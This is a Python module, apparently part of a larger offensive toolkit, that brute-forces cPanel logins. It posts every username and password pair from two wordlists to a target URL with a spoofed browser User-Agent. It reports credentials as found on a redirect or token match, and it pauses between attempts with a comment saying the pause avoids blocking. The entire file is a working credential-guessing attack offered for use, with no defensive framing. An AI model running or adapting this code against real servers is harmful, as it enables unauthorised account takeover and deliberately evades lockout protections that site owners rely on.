import requests
import time
from core.base_module import BaseModule


class CPanelBruteforce(BaseModule):
    def __init__(self, url):
        super().__init__("cPanel Bruteforce")

        self.url = url
        self.users_file = "modules/bruteforce/wordlists/users.txt"
        self.passwords_file = "modules/bruteforce/wordlists/passwords.txt"

    def load_wordlist(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []

    def is_login_success(self, response):
        # 🔥 detección básica (ajustable)
        if response.status_code == 302:
            return True

        if "security_token" in response.text:
            return True

        if "login failed" in response.text.lower():
            return False

        return False

    def run(self, data):
        results = []

        users = self.load_wordlist(self.users_file)
        passwords = self.load_wordlist(self.passwords_file)

        for user in users:
            for password in passwords:
                try:
                    payload = {
                        "user": user,
                        "pass": password
                    }

                    response = requests.post(
                        self.url,
                        data=payload,
                        timeout=(5, 15),
                        allow_redirects=False,
                        headers={
                            "User-Agent": "Mozilla/5.0"
                        }
                    )

                    if self.is_login_success(response):
                        result = {
                            "url": self.url,
                            "username": user,
                            "password": password,
                            "status": "valid credentials"
                        }

                        print(f"[+] FOUND: {user}:{password}")

                        results.append(result)
                        return results  # parar al encontrar

                    else:
                        print(f"[-] Failed: {user}:{password}")

                    time.sleep(0.5)  # 🔥 evita bloqueo

                except Exception:
                    continue

        return results